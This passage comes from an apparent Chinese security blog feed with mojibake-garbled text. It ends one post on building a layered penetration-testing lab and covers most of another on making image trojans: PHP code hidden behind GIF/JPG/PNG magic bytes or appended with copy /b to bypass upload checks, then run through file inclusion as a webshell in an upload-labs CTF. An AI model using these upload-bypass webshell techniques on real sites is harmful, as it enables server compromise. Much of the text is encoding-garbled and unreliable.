aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¯åŠ¨vmware fusionç½‘ç»œæœåŠ¡ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p><pre class="line-numbers language-none"><code class="language-none">sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿é™©èµ·è§é‡å¯VMwareè¿›è¡Œæµ‹è¯•ã€‚</p><p><strong>web2æµ‹è¯•</strong></p><p>web2å¯ä»¥è®¿é—®äº’è”ç½‘äº†ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.12.49.png" alt="æˆªå±2024-12-30 17.12.49" style="zoom:50%;"><p><strong>PC1æµ‹è¯•</strong></p><p>PC1å’Œweb2å¯ä»¥äº’ç›¸è®¿é—®ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.16.22.png" style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.17.16.png" style="zoom:50%;"><p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.18.11.png" alt="æˆªå±2024-12-30 17.18.11"></p><p>PC1ä¹Ÿå¯ä»¥è®¿é—®äº’è”ç½‘äº†ï¼âœ…ã€‚</p><p>é‡æ–°å¼€å¯dhcpçš„é…ç½®è¿˜æ˜¯å¯ä»¥çš„ã€‚</p><ul><li>é‡æ–°ç»™web1é…ç½®ç½‘å¡çš„æ—¶å€™ï¼ŒPC1å’Œweb2åˆæ— æ³•è¿æ¥äº’è”ç½‘äº†</li></ul><p>é‚æ‰§è¡Œsudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli â€“startï¼Œåé‡å¯VMwareã€‚</p><p>é—®é¢˜å¾—åˆ°è§£å†³ã€‚</p><p>è‡³æ­¤ï¼Œé¶åœºç¯å¢ƒæ­å»ºå®Œæ¯•ã€‚</p><p>å›é¡¾ä¸€ä¸‹æ•´ä¸ªé¶åœºçš„æ¶æ„ï¼š</p><h2 id="2-6-é¶åœºæ¶æ„å›é¡¾"><a href="#2-6-é¶åœºæ¶æ„å›é¡¾" class="headerlink" title="2.6 é¶åœºæ¶æ„å›é¡¾"></a>2.6 é¶åœºæ¶æ„å›é¡¾</h2><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.37.46.png" alt="é¶åœºæ‹“æ‰‘å›é¡¾" style="zoom:80%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.05.54.png" style="zoom:50%;"><h1 id="ä¸‰ã€æœåŠ¡éƒ¨ç½²"><a href="#ä¸‰ã€æœåŠ¡éƒ¨ç½²" class="headerlink" title="ä¸‰ã€æœåŠ¡éƒ¨ç½²"></a>ä¸‰ã€æœåŠ¡éƒ¨ç½²</h1><h2 id="3-1-DMZåŒºçš„-Ubuntu-å¯åŠ¨nginxæœåŠ¡å’ŒredisæœåŠ¡"><a href="#3-1-DMZåŒºçš„-Ubuntu-å¯åŠ¨nginxæœåŠ¡å’ŒredisæœåŠ¡" class="headerlink" title="3.1 DMZåŒºçš„ Ubuntu å¯åŠ¨nginxæœåŠ¡å’ŒredisæœåŠ¡"></a>3.1 DMZåŒºçš„ Ubuntu å¯åŠ¨nginxæœåŠ¡å’ŒredisæœåŠ¡</h2><ul><li>sudo redis-server /etc/redis.conf ã€æ³¨æ„ï¼šä»¥rootæƒé™å¯åŠ¨ã€‘</li><li>/usr/sbin/nginx -c /etc/nginx/nginx.conf ã€nginxå·²ç»å¯åŠ¨ã€‘</li></ul><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.24.23.png" style="zoom:50%;"><p>ç«¯å£è¢«å ç”¨ã€‚</p><p>rebootä¹‹åé‡æ–°æŸ¥çœ‹ç«¯å£ï¼Œä¾ç„¶è¢«å ç”¨ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.27.53.png" style="zoom:50%;"><p>æŸ¥çœ‹accesss.logï¼Œcat /var/log/nginx/access.log</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.37.54.png" style="zoom:50%;"><p>tail -f /var/log/nginx/access.log è¿½è¸ªæ—¥å¿—</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.40.38.png" style="zoom:50%;"><p>æ’æŸ¥å ç”¨ç«¯å£çš„è¿›ç¨‹ï¼š</p><p>æ™®é€šæƒé™æ‰§è¡Œæ—¶çœ‹ä¸åˆ°pid</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.43.17.png" style="zoom:50%;"><p>sudoæ‰§è¡Œæ—¶å¯ä»¥çœ‹åˆ°pid</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.44.15.png" style="zoom:50%;"><p>æ€æ­»PID=826çš„è¿›ç¨‹ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.45.21.png" style="zoom:50%;"><p>ç„¶åå°è¯•å¯åŠ¨nginxã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.46.57.png" style="zoom:50%;"><p>è¿˜æ˜¯502é”™è¯¯ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.47.42.png" style="zoom:50%;"><p>é‡åˆ° Nginx 502 Bad Gateway é”™è¯¯é€šå¸¸è¡¨ç¤º Nginx ä½œä¸ºä»£ç†æœåŠ¡å™¨åœ¨å°è¯•ä»ä¸Šæ¸¸æœåŠ¡å™¨è·å–å“åº”æ—¶æœªèƒ½æˆåŠŸã€‚</p><p>è¿½è¸ªæŠ¥é”™ tail -f /var/log/nginx/error.log</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.52.27.png" style="zoom:50%;"><p><strong>ä¸Šæ¸¸æœåŠ¡å™¨ä¿¡æ¯</strong>ï¼š<code>upstream: "https://47.101.57.72:443/"</code> å’Œ <code>upstream: "https://47.101.57.72:443/favicon.ico"</code> è¡¨ç¤º Nginx å°è¯•è¿æ¥çš„ä¸Šæ¸¸æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£ï¼Œä½†æ˜¯è¿æ¥å¤±è´¥ï¼Œåç«¯æœåŠ¡æŒ‚æ‰äº†ã€‚</p><p>è¿™äº›é”™è¯¯æ—¥å¿—è¡¨æ˜ Nginx ä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨ï¼Œå°è¯•å°†è¯·æ±‚è½¬å‘åˆ°ä¸Šæ¸¸æœåŠ¡å™¨ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯ IP åœ°å€ä¸º <code>47.101.57.72</code> çš„æœåŠ¡å™¨ï¼‰æ—¶ï¼Œè¿æ¥è¢«æ‹’ç»ã€‚</p><p>ç›®å‰å¯ä»¥ä¸ç”¨ç†ä¼šï¼Œé¶åœºæ¸—é€è¿‡ç¨‹ä¸­ä¹Ÿç”¨ä¸åˆ°è¿™ä¸ª80ç«¯å£çš„ç«™ç‚¹ã€‚</p><p>è®¿é—®81ç«¯å£ï¼Œå¯ä»¥æˆåŠŸè®¿é—®åˆ°é¶åœºweb1çš„å¦ä¸€ä¸ªç«™ç‚¹ï¼š</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2011.01.03.png" style="zoom:50%;"><p>å¯¹äºæ¸—é€æ¥è¯´è¶³å¤Ÿäº†ã€‚</p><ul><li><p>iptables -F</p><blockquote><p><code>iptables -F</code> æ˜¯ä¸€ä¸ªåœ¨ Linux ç³»ç»Ÿä¸­ä½¿ç”¨çš„å‘½ä»¤ï¼Œå®ƒç”¨äºæ¸…ç©ºï¼ˆFlushï¼‰<code>iptables</code> çš„æ‰€æœ‰è§„åˆ™ã€‚<code>iptables</code> æ˜¯ Linux å†…æ ¸ä¸­çš„ä¸€ä¸ªåŒ…è¿‡æ»¤æ¡†æ¶ï¼Œç”¨äºé…ç½®ç½‘ç»œæµé‡çš„é˜²ç«å¢™è§„åˆ™ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œ<code>iptables -F</code> å‘½ä»¤ä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ol><li><strong>æ¸…ç©ºæ‰€æœ‰é“¾ï¼ˆChainsï¼‰</strong>ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>iptables -F</code> ä¼šæ¸…ç©ºé»˜è®¤çš„ä¸‰ä¸ªè¡¨ï¼ˆfilterã€natã€mangleï¼‰ä¸­çš„æ‰€æœ‰é“¾ï¼ˆINPUTã€FORWARDã€OUTPUTã€PREROUTINGã€POSTROUTINGç­‰ï¼‰ã€‚</li><li><strong>ä¸åˆ é™¤ç”¨æˆ·å®šä¹‰çš„é“¾</strong>ï¼šå¦‚æœä½ åˆ›å»ºäº†è‡ªå®šä¹‰çš„é“¾ï¼Œå®ƒä»¬ä¸ä¼šè¢« <code>iptables -F</code> å‘½ä»¤åˆ é™¤ã€‚</li><li><strong>ä¿ç•™é»˜è®¤ç­–ç•¥</strong>ï¼š<code>iptables -F</code> ä¸ä¼šæ”¹å˜é“¾çš„é»˜è®¤ç­–ç•¥ï¼ˆé»˜è®¤ç­–ç•¥æ˜¯æŒ‡å½“ä¸€ä¸ªåŒ…æ²¡æœ‰åŒ¹é…ä»»ä½•è§„åˆ™æ—¶ï¼Œiptables å°†å¦‚ä½•å¤„ç†è¿™ä¸ªåŒ…ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœé»˜è®¤ç­–ç•¥æ˜¯ <code>ACCEPT</code>ï¼Œå³ä½¿æ¸…ç©ºäº†æ‰€æœ‰è§„åˆ™ï¼Œè¿™ä¸ªé»˜è®¤ç­–ç•¥ä»ç„¶ä¼šä¿ç•™ã€‚</li><li><strong>ç«‹å³ç”Ÿæ•ˆ</strong>ï¼š<code>iptables -F</code> å‘½ä»¤ä¼šç«‹å³ç”Ÿæ•ˆï¼Œä¸éœ€è¦é‡å¯ç½‘ç»œæœåŠ¡ã€‚</li></ol></blockquote><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.23.37.png" style="zoom:50%;"></li></ul><h2 id="3-2-äºŒå±‚ç½‘ç»œçš„-web2å¯åŠ¨dockerå®¹å™¨"><a href="#3-2-äºŒå±‚ç½‘ç»œçš„-web2å¯åŠ¨dockerå®¹å™¨" class="headerlink" title="3.2 äºŒå±‚ç½‘ç»œçš„ web2å¯åŠ¨dockerå®¹å™¨"></a>3.2 äºŒå±‚ç½‘ç»œçš„ web2å¯åŠ¨dockerå®¹å™¨</h2><ul><li>sudo service docker start</li><li>sudo docker start 8e172820ac78</li></ul><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.13.32.png" style="zoom:50%;"><h2 id="3-3-ç¬¬äºŒå±‚ç½‘ç»œçš„-PC1-å¯åŠ¨é€šè¾¾OA"><a href="#3-3-ç¬¬äºŒå±‚ç½‘ç»œçš„-PC1-å¯åŠ¨é€šè¾¾OA" class="headerlink" title="3.3 ç¬¬äºŒå±‚ç½‘ç»œçš„ PC1 å¯åŠ¨é€šè¾¾OA"></a>3.3 ç¬¬äºŒå±‚ç½‘ç»œçš„ PC1 å¯åŠ¨é€šè¾¾OA</h2><ul><li>C:\MYOA\bin\AutoConfig.exe</li></ul><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.18.14.png" style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.18.45.png" style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.19.11.png" style="zoom:70%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.20.13.png" style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.20.42.png" style="zoom:50%;"><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è‡³æ­¤é¶åœºéƒ¨ç½²å®Œæ¯•ï¼Œç›®æ ‡IPä¸º192.168.43.253ï¼Œå¯ä»¥å¼€å§‹æ¸—é€ä¹‹æ—…äº†ã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul><li><a href="https://blog.csdn.net/swadian2008/article/details/109518783">https://blog.csdn.net/swadian2008/article/details/109518783</a></li><li><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/">http://vulnstack.qiyuanxuetang.net/vuln/detail/9/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ç»¼åˆæ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ”»é˜² </tag>
            
            <tag> éš§é“æ­å»º </tag>
            
            <tag> ç»¼åˆæ¸—é€ </tag>
            
            <tag> åŸŸæ¸—é€ </tag>
            
            <tag> WHOAMIé¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›¾ç‰‡æœ¨é©¬åˆ¶ä½œ</title>
      <link href="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/"/>
      <url>/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ–¹æ³•æ¦‚è§ˆ"><a href="#ä¸€ã€æ–¹æ³•æ¦‚è§ˆ" class="headerlink" title="ä¸€ã€æ–¹æ³•æ¦‚è§ˆ"></a>ä¸€ã€æ–¹æ³•æ¦‚è§ˆ</h1><p>å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œï¼ˆ winç³»ç»Ÿå®Œæˆï¼‰ã€‚</p><h2 id="æ–¹æ³•1ï¼šGIF89a"><a href="#æ–¹æ³•1ï¼šGIF89a" class="headerlink" title="æ–¹æ³•1ï¼šGIF89a"></a>æ–¹æ³•1ï¼šGIF89a</h2><p>æ–°å»º info.gif</p><p>å†…å®¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GIF98a<span class="token operator">&lt;</span>?php phpinfo?<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="æ–¹æ³•2-å‘½ä»¤è¡Œæ–¹æ³•â€”â€”æ–‡ä»¶åˆå¹¶"><a href="#æ–¹æ³•2-å‘½ä»¤è¡Œæ–¹æ³•â€”â€”æ–‡ä»¶åˆå¹¶" class="headerlink" title="æ–¹æ³•2:å‘½ä»¤è¡Œæ–¹æ³•â€”â€”æ–‡ä»¶åˆå¹¶"></a>æ–¹æ³•2:å‘½ä»¤è¡Œæ–¹æ³•â€”â€”æ–‡ä»¶åˆå¹¶</h2><p>å‡†å¤‡ä¸€ä¸ªå›¾ç‰‡å’Œä¸€ä¸ªphpä»£ç æ–‡ä»¶ã€‚</p><p>copy å›¾ç‰‡.jpg/b+ä»£ç .php/a å›¾ç‰‡_ä»£ç .jpg</p><p>æ•ˆæœï¼šå›¾ç‰‡èƒ½çœ‹ï¼Œä½†æ˜¯å…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚å¯èƒ½ç ´åä»£ç ç»“æ„ï¼Œå¯¼è‡´ä»£ç ä¸å¯è¿è¡Œã€‚è§£å†³ï¼šæ¢ä¸€ç§æ–¹æ³•æˆ–æ¢ä¸€ä¸ªå›¾ç‰‡ï¼ˆä¸å¥½æï¼‰ã€‚</p><h2 id="æ–¹æ³•3-å±æ€§-è¯¦ç»†ä¿¡æ¯-ç‰ˆæƒç­‰"><a href="#æ–¹æ³•3-å±æ€§-è¯¦ç»†ä¿¡æ¯-ç‰ˆæƒç­‰" class="headerlink" title="æ–¹æ³•3:å±æ€§-è¯¦ç»†ä¿¡æ¯-ç‰ˆæƒç­‰"></a>æ–¹æ³•3:å±æ€§-è¯¦ç»†ä¿¡æ¯-ç‰ˆæƒç­‰</h2><p>å°†æ¶æ„ä»£ç å†™åœ¨ å›¾ç‰‡å±æ€§-è¯¦ç»†ä¿¡æ¯-ç‰ˆæƒç­‰ä½ç½®</p><p>å›¾ç‰‡èƒ½çœ‹ï¼Œä½†æ˜¯å…¶ä¸­åŒ…å«æ¶æ„ä»£ç </p><h2 id="æ–¹æ³•4-åˆ©ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨-æ–‡ä»¶å¹»æœ¯"><a href="#æ–¹æ³•4-åˆ©ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨-æ–‡ä»¶å¹»æœ¯" class="headerlink" title="æ–¹æ³•4:åˆ©ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨+æ–‡ä»¶å¹»æœ¯"></a>æ–¹æ³•4:åˆ©ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨+æ–‡ä»¶å¹»æœ¯</h2><p>æˆ‘ä»¬çŸ¥é“æ‰€æœ‰çš„jpgå›¾ç‰‡çš„æ–‡ä»¶å¤´éƒ¨éƒ½æ˜¯ç›¸åŒçš„ï¼Œpngå’Œgifå›¾ç‰‡ä¹Ÿæ˜¯ä¸€æ ·ã€‚</p><p>æ–‡ä»¶å¹»æ•°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gif <span class="token number">47</span> <span class="token number">49</span> <span class="token number">46</span> <span class="token number">38</span> <span class="token number">39</span> <span class="token number">61</span> F1 00 2C 01 F7 00 00 <span class="token number">64</span> <span class="token number">32</span> <span class="token number">33</span>jpgFF D8 FF E0 00 <span class="token number">10</span> 4A <span class="token number">46</span> <span class="token number">49</span> <span class="token number">46</span> 00 01 01 01 01 2Cpng  <span class="token number">89</span> <span class="token number">50</span> 4E <span class="token number">47</span> 0D 0A 1A 0A 00 00 00 0D <span class="token number">49</span> <span class="token number">48</span> <span class="token number">44</span> <span class="token number">52</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>notepad++ æ’ä»¶-åå…­è¿›åˆ¶è½¬ASCIIï¼Œç„¶ååœ¨ä¸‹é¢å†™ä¸Šæœ¨é©¬å†…å®¹ã€‚å¯ä»¥ç»•è¿‡ getimagesize å¯¹å†…å®¹çš„æ£€æµ‹ã€‚</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2021-07-03%20%E4%B8%8A%E5%8D%8811.22.04.png" style="zoom:75%;"><p>ä¹Ÿå¯ä»¥ä½¿ç”¨010editorï¼Œå®‰è£…æ¿€æ´»æ–¹æ³•è§æœ¬ç«™ã€Š010editoråå…­è¿›åˆ¶ç¼–è¾‘å™¨ã€‹ä¸€æ–‡ã€‚</p><p>upload-labs 14å…³ç»•è¿‡ï¼š</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2021-07-03%20%E4%B8%8A%E5%8D%8811.24.35.png" style="zoom:75%;"><p>src=â€../upload/6320210703112421.jpgâ€</p><p>ä¸Šä¼ æˆåŠŸã€‚æœåŠ¡å™¨æ ¹æ®æ£€æµ‹çš„å†…å®¹ï¼Œåˆ¤å®šçš„jpgå›¾åƒï¼Œå¹¶è¿›è¡Œé‡å‘½åã€‚</p><h1 id="äºŒã€å®æˆ˜æ¡ˆä¾‹"><a href="#äºŒã€å®æˆ˜æ¡ˆä¾‹" class="headerlink" title="äºŒã€å®æˆ˜æ¡ˆä¾‹"></a>äºŒã€å®æˆ˜æ¡ˆä¾‹</h1><p>ä»¥ buuoj-(Upload-Labs-Linux)-pass-13ä¸ºä¾‹ã€‚</p><h2 id="2-1-jpgå›¾ç‰‡æœ¨é©¬åˆ¶ä½œ"><a href="#2-1-jpgå›¾ç‰‡æœ¨é©¬åˆ¶ä½œ" class="headerlink" title="2.1 jpgå›¾ç‰‡æœ¨é©¬åˆ¶ä½œ"></a>2.1 jpgå›¾ç‰‡æœ¨é©¬åˆ¶ä½œ</h2><ul><li>ä¸Šä¼ yjh.phpæŠ“åŒ…</li></ul><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2015.23.20.png" style="zoom:50%;"><p>æç¤ºæ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ã€‚</p><ul><li>ä»…æ”¹åç¼€ä¸º.jpg</li></ul><p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2015.24.29.png" alt="img"></p><p>æ— æ³•ä¸Šä¼ ï¼Œå¯èƒ½æ£€æµ‹MIMEæˆ–æ–‡ä»¶å†…å®¹ã€‚</p><p>ä¿®æ”¹MIMEç±»å‹ï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œè¯´æ˜æ£€æµ‹çš„æ˜¯æ–‡ä»¶å†…å®¹ï¼ˆæ–‡ä»¶å¤´ï¼‰ã€‚</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2015.25.47.png" style="zoom:50%;"><ul><li>jpgå›¾ç‰‡æœ¨é©¬åˆ¶ä½œ</li></ul><p>jpgæ–‡ä»¶å¹»æ•°</p><blockquote><p>å¦‚æœä½ ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ä¸€ä¸ª JPG æ–‡ä»¶ï¼Œæ–‡ä»¶çš„å‰å‡ ä¸ªå­—èŠ‚é€šå¸¸æ˜¯ <code>FF D8 FF</code>ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-none"><code class="language-none">FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60 00 00 ...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>FF D8 FF</code> æ˜¯ JPG æ–‡ä»¶çš„æ–‡ä»¶ç­¾åã€‚</li><li>åç»­çš„å­—èŠ‚æ˜¯æ–‡ä»¶çš„å…¶ä»–å…ƒæ•°æ®å’Œå›¾åƒæ•°æ®ã€‚</li></ul></blockquote><p>å…ˆå®éªŒä¸€ä¸‹é•¿çš„å¹»æ•°ï¼š<code>FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 01 2C</code></p><p>å°†yjh.phpåç¼€æ”¹æˆ.jpg</p><p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2015.29.37.png" alt="img"></p><p>ç”¨010editoråå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼šï¼ˆå®‰è£…æ¿€æ´»æ–¹æ³•è§æœ¬ç«™ã€Š010editoråå…­è¿›åˆ¶ç¼–è¾‘å™¨ã€‹ä¸€æ–‡ã€‚ï¼‰</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2016.30.56.png" style="zoom:50%;"><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2016.39.08.png" style="zoom:50%;"><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2016.39.46.png" style="zoom:50%;"><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2016.43.39.png" style="zoom:50%;"><p>ä¿å­˜ã€‚</p><p>ä¸Šä¼ æŠ“åŒ…ï¼š</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2016.49.53.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°å¦‚æœç†Ÿæ‚‰yakitçš„è¯åº”è¯¥èƒ½ç›´æ¥åœ¨è¯·æ±‚åŒ…è¿™é‡Œåˆ¶ä½œå›¾ç‰‡æœ¨é©¬ã€‚</p><p>å›¾ç‰‡æœ¨é©¬æˆåŠŸä¸Šä¼ ã€‚ä½†æ˜¯å¦‚ä½•è§£ææ‰§è¡Œå‘¢ï¼Ÿ</p><p>ç‚¹å‡»<code>æ–‡ä»¶åŒ…å«æ¼æ´</code></p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2016.56.06.png" style="zoom:50%;"><p>åªéœ€è¦åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«ä»¥ä¸‹å³å¯ï¼š</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2016.57.26.png" style="zoom:50%;"><ul><li>èšå‰‘getshellï¼š</li></ul><p>è®¿é—®ä¸Šä¼ æˆåŠŸçš„å›¾ç‰‡ã€‚</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2017.01.48.png" style="zoom:50%;"><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2017.01.17.png" style="zoom:50%;"><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2017.02.45.png" style="zoom:50%;"><p>Flag:</p><pre class="line-numbers language-none"><code class="language-none">flag{a24f5301-e5b2-4a4b-a979-c53a15b86360}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-2-å…¶ä»–å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ"><a href="#2-2-å…¶ä»–å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ" class="headerlink" title="2.2 å…¶ä»–å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ"></a>2.2 å…¶ä»–å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ</h2><p>å…¶ä»–å›¾ç‰‡æœ¨é©¬åˆ¶ä½œç±»ä¼¼ï¼ŒåŒºåˆ«ä»…åœ¨äºæ–‡ä»¶å¹»æ•°ã€‚</p><p>gif </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">47</span> <span class="token number">49</span> <span class="token number">46</span> <span class="token number">38</span> <span class="token number">39</span> <span class="token number">61</span> F1 00 2C 01 F7 00 00 <span class="token number">64</span> <span class="token number">32</span> <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>png</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">89</span> <span class="token number">50</span> 4E <span class="token number">47</span> 0D 0A 1A 0A 00 00 00 0D <span class="token number">49</span> <span class="token number">48</span> <span class="token number">44</span> <span class="token number">52</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-3-ä½¿ç”¨yakitå¿«é€Ÿä¸Šä¼ å›¾ç‰‡æœ¨é©¬"><a href="#2-3-ä½¿ç”¨yakitå¿«é€Ÿä¸Šä¼ å›¾ç‰‡æœ¨é©¬" class="headerlink" title="2.3 ä½¿ç”¨yakitå¿«é€Ÿä¸Šä¼ å›¾ç‰‡æœ¨é©¬"></a>2.3 ä½¿ç”¨yakitå¿«é€Ÿä¸Šä¼ 